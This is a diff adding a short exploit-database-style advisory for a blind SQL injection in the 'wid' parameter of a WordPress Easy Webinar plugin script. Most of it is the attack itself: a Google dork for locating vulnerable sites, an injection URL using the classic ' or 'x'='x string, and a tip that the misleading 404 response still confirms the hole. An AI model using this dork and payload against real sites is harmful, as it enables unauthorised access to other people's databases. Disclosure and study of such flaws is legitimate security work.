@@ -1,0 +1,30 @@
+# Exploit Title: Wordpress Easy Webinar Plugin Blind SQL Injection Vulnerability
+
+# Vendor Homepage: www.easywebinarplugin.com
+
+# Date: 10/26/2012
+
+# Author: Robert Cooper (robert.cooper [at] areyousecure.net)
+
+# Tested on: [Linux/Windows 7]
+
+#Vulnerable Parameters: wid=
+
+
+# Google Dork: allinurl: get-widget.php?wid=
+
+##############################################################
+Exploit:
+
+www.example.com/wp-content/plugins/webinar_plugin/get-widget.php?wid=[SQLi]
+
+Note: The HTTP response will read 404, but this is false:
+
+www.example.com/wp-content/plugins/webinar_plugin/get-widget.php?wid=3' or 'x'='x
+
+This will result in the page loading correctly and show that the plugin is vulnerable to injection (string).
+##############################################################
+
+www.areyousecure.net
+
+# Shouts to the Belegit crew
